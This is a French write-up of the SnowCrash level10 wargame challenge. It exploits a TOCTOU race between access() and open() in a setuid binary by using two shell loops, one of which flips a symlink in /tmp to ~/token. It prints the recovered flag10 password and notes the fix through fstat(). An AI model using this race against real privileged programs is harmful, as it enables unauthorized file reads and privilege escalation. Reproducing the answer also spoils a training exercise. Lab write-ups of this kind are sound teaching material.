# SnowCrash - level10 writeup

## Objectif

Exploiter une condition de course (TOCTOU) dans level10 pour lire ~/token et récupérer le mot de passe de flag10.

## Recon

Le binaire prend 2 arguments : un fichier et un hôte.
Exemple d’exécution :

```
./level10 "file" localhost
```

L’analyse statique (ex: objdump -d) suggère qu’il y a une vérification d’accès sur le fichier avant utilisation, ce qui rend probable un TOCTOU.

## Analyse

Principe :

- le programme vérifie des droits (ex: access()) sur un chemin
- puis ouvre ce chemin plus tard (open())
- si on remplace le fichier entre les deux - on contourne la vérification

On utilise un lien symbolique mutable /tmp/exploit qui alterne rapidement entre un fichier autorisé et le fichier ~/token.

## Exploitation

Deux boucles en parallèle :

### Script 1 - spam d’exécution de level10

```
while true; do ./level10 /tmp/exploit <host>; done
```

### Script 2 - bascule du symlink pour gagner la course

```
while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
```

Quand la course est gagnée, level10 lit le contenu de ~/token et il apparaît en sortie.

Mot de passe obtenu :

```
woupa2yuojeeaaed06riuj63c
```

## Résultat

- Technique - > TOCTOU race condition via symlink swap
- Password flag10 - > woupa2yuojeeaaed06riuj63c

## Notes

- Vulnérabilité : utiliser access() puis open() sur un chemin modifiable
- Correction : ouvrir le fichier une seule fois et vérifier ensuite via fstat() (ou utiliser open() avec protections adaptées)
- Les symlinks dans /tmp sont un classique pour ce type d’attaque
